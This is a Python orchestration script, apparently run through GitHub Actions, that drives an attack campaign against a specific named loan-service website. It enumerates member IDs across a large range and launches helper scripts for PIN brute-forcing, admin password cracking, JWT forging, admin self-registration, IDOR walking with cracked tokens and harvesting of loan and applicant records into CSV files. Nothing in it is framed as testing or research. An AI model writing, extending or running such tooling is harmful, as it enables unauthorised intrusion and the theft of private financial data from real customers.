#!/usr/bin/env python3
"""Strike driver for GitHub Actions runs. Flat-layout: scripts + state live in cwd.

usage: tick.py PHASE SIZE
PHASE: health | enum | pin | harvest | admin | same_day | idor | full | sweep
# full and sweep are identical; admin is driven by dedicated sharded lanes.
SIZE : enum slice size (numbers to scan this run)
"""
import json
import os
import socket
import subprocess
import sys
import time
import urllib.request

ROOT = os.getcwd()
OUT = os.path.join(ROOT, "out")
os.makedirs(OUT, exist_ok=True)


def log(msg):
    print("[tick]", msg, flush=True)


def sh(cmd):
    log("$ " + " ".join(str(c) for c in cmd))
    t0 = time.time()
    rc = subprocess.call([str(c) for c in cmd], cwd=ROOT)
    log(f"exit={rc} in {int(time.time() - t0)}s")
    return rc


def egress_ip():
    try:
        with urllib.request.urlopen("https://api.ipify.org", timeout=10) as r:
            return r.read().decode().strip()
    except Exception as e:
        return f"unknown({e.__class__.__name__})"


def health(retries=3):
    for i in range(retries):
        try:
            req = urllib.request.Request("https://m.okbigyo.com:9443/bigyo/api/common/time")
            with urllib.request.urlopen(req, timeout=25) as r:
                body = r.read(300).decode(errors="replace")
                log(f"HEALTH_OK [{r.status}] {body}")
                return True
        except Exception as e:
            log(f"health try{i}: {e.__class__.__name__}: {e}")
            time.sleep(10)
    log("HEALTH_FAIL")
    return False


def load(name, default=None):
    fp = os.path.join(ROOT, name)
    if os.path.exists(fp):
        try:
            return json.load(open(fp))
        except Exception:
            pass
    return default if default is not None else {}


def save(name, obj):
    with open(os.path.join(ROOT, name), "w") as f:
        json.dump(obj, f, ensure_ascii=False, indent=1)


FULLISH = ("full", "sweep")
CURSOR_FILE = "state_hunt_cursor.json"
SCAN_FLOOR = 40000000
SCAN_CEIL = 99000000


def enum_slice(n):
    cur = load(CURSOR_FILE, {"next": SCAN_FLOOR, "end": SCAN_FLOOR + 1000000})
    if cur["next"] >= cur["end"]:
        block = (cur["end"] // 1000000 + 1) * 1000000
        if block >= SCAN_CEIL:
            log("ENUM_SPACE_EXHAUSTED")
            return None
        cur = {"next": block, "end": min(block + 1000000, SCAN_CEIL)}
        save(CURSOR_FILE, cur)
    lo = cur["next"]
    hi = min(cur["end"], lo + n)
    cur["next"] = hi
    save(CURSOR_FILE, cur)
    log(f"ENUM_SLICE {lo}-{hi}")
    return (lo, hi)


def count_lines(*files):
    out = {}
    for fn in files:
        fp = os.path.join(ROOT, fn)
        out[fn] = sum(1 for _ in open(fp)) - 1 if os.path.exists(fp) else 0
    return out


def main():
    phase = sys.argv[1] if len(sys.argv) > 1 else "full"
    size = int(sys.argv[2]) if len(sys.argv) > 2 else 5000
    ip = egress_ip()
    log(f"RUN_START phase={phase} size={size} egress={ip} tz_utc={time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())}")
    ok = health()
    manifest = {"ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), "phase": phase, "egress_ip": ip, "health": ok}

    if ok and phase in ("admin",) and not os.path.exists(os.path.join(ROOT, "admin_token.json")):
        sh(["python3", "admin_cracker.py"])
    if ok and (phase in FULLISH or phase == "enum"):
        sl = enum_slice(size)
        if sl:
            sh(["python3", "hunt_members.py", str(sl[0]), str(sl[1]), "4"])
        manifest["enum"] = sl
    if ok and (phase in FULLISH or phase == "pin"):
        sh(["python3", "pin_attacker.py"])
    if ok and (phase in FULLISH or phase == "harvest"):
        sh(["python3", "harvest_loans.py"])
    if ok and phase == "reset":
        sh(["python3", "reset_probe.py"])
    if ok and (phase in FULLISH or phase == "callbacks"):
        sh(["python3", "callback_probe.py"])
    if ok and (phase in FULLISH or phase == "jwtforge") and not os.path.exists(os.path.join(ROOT, "admin_token.json")):
        sh(["python3", "jwt_forger.py"])
    if ok and (phase in FULLISH or phase == "selfreg") and not os.path.exists(os.path.join(ROOT, "admin_token.json")):
        sh(["python3", "admin_selfreg.py"])
    if ok and (phase in FULLISH or phase == "oracle"):
        sh(["python3", "admin_oracle.py"])
    if ok and (phase in FULLISH or phase == "same_day"):
        sh(["python3", "admin_same_day.py"])
    if ok and (phase in FULLISH or phase == "idor"):
        if os.path.exists(os.path.join(ROOT, "cracked_tokens.json")):
            toks = load("cracked_tokens.json", [])
            if toks:
                sh(["python3", "idor_walker.py"])

    manifest["counts"] = count_lines(
        "members_live.csv", "loans_realtime.csv", "same_day_applicants.csv", "loan_flows_recent.csv"
    )
    save("out/manifest.json", manifest)
    log("MANIFEST " + json.dumps(manifest, ensure_ascii=False))
    log("RUN_END")


if __name__ == "__main__":
    main()
